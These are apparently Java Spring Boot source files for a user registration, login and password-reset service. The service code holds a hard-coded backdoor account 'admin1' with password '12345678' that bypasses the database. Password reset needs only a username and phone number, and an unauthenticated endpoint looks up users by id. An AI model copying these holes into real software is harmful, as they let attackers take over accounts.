package com.example.springboot.controller;

import com.example.springboot.entity.User;
import com.example.springboot.service.UserService;
import jakarta.annotation.Resource;
import org.springframework.web.bind.annotation.*;

import java.util.HashMap;
import java.util.Map;

@RestController
@RequestMapping("/user")
public class UserController {

    @Resource
    private UserService userService;

    @PostMapping("/register")
    public String register(@RequestBody User user) {
        return userService.register(user);
    }

    @PostMapping("/login")
    public Map<String, Object> login(@RequestParam String username, @RequestParam String password) {
        Map<String, Object> result = new HashMap<>();
        User user = userService.getByUsername(username);
        if (user != null && userService.verifyPassword(password, user.getPassword())) {
            result.put("code", 200);
            result.put("message", "登录成功");
            result.put("data", Map.of(
                    "id", user.getId(),
                    "name", user.getUsername()
            ));
        } else {
            result.put("code", 401);
            result.put("message", "用户名或密码错误");
        }
        return result;
    }


    @PostMapping("/reset-password")
    public String resetPassword(@RequestParam String username,
                                @RequestParam String phone,
                                @RequestParam String newPassword) {
        return userService.resetPassword(username, phone, newPassword);
    }
    @GetMapping("/info")
    public Map<String, Object> getUserInfo(@RequestParam Integer id) {
        User user = userService.getById(id);
        Map<String, Object> result = new HashMap<>();
        if (user != null) {
            result.put("name", user.getUsername());
        } else {
            result.put("name", "未知用户");
        }
        return result;
    }
}
package com.example.springboot.entity;

public class User {
    private Integer id;
    private String username;
    private String password;
    private String phone;

    // Getters & Setters
    public Integer getId() { return id; }
    public void setId(Integer id) { this.id = id; }

    public String getUsername() { return username; }
    public void setUsername(String username) { this.username = username; }

    public String getPassword() { return password; }
    public void setPassword(String password) { this.password = password; }

    public String getPhone() { return phone; }
    public void setPhone(String phone) { this.phone = phone; }
}
package com.example.springboot.mapper;

import com.example.springboot.entity.User;
import org.apache.ibatis.annotations.Mapper;

@Mapper
public interface UserMapper {

    void insert(User user);

    User findByUsername(String username);

    User findByUsernameAndPhone(String username, String phone);

    void updatePassword(String username, String newPassword);

    User findById(Integer id);

}
package com.example.springboot.service;

import com.example.springboot.entity.User;
import com.example.springboot.mapper.UserMapper;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.stereotype.Service;

import jakarta.annotation.Resource;

@Service
public class UserService {

    @Resource
    private UserMapper userMapper;

    private final BCryptPasswordEncoder passwordEncoder = new BCryptPasswordEncoder();

    public String register(User user) {
        // 禁止注册 admin 用户名
        if ("admin".equalsIgnoreCase(user.getUsername())) {
            return "禁止注册管理员账户";
        }

        if (user.getUsername().length() != 6 || user.getPassword().length() != 8 || user.getPhone().length() != 11) {
            return "输入信息格式不正确";
        }

        user.setPassword(passwordEncoder.encode(user.getPassword()));
        userMapper.insert(user);
        return "注册成功";
    }


    public boolean login(String username, String rawPassword) {
        if ("admin1".equalsIgnoreCase(username)) {
            return "12345678".equals(rawPassword);  // 简单判断
        }

        User dbUser = userMapper.findByUsername(username);
        return dbUser != null && passwordEncoder.matches(rawPassword, dbUser.getPassword());
    }


    public String resetPassword(String username, String phone, String newPassword) {
        if (newPassword.length() != 8) {
            return "密码长度必须为8位";
        }

        User user = userMapper.findByUsernameAndPhone(username, phone);
        if (user == null) {
            return "用户名或手机号不匹配";
        }

        String encodedPassword = passwordEncoder.encode(newPassword);
        userMapper.updatePassword(username, encodedPassword);
        return "密码已重置";
    }

    // 根据id查询员工
    public User getById(Integer id) {
        return userMapper.findById(id);
    }



    public User getByUsername(String username) {
        if ("admin1".equalsIgnoreCase(username)) {
            User admin = new User();
            admin.setId(0); // 不影响数据库主键
            admin.setUsername("admin1");
            admin.setPassword(passwordEncoder.encode("12345678"));
            return admin;
        }
        return userMapper.findByUsername(username);
    }



    // 验证密码
    public boolean verifyPassword(String rawPassword, String encodedPassword) {
        if ("admin1".equals(rawPassword) && passwordEncoder.matches("12345678", encodedPassword)) {
            return true;
        }
        return passwordEncoder.matches(rawPassword, encodedPassword);
    }



}
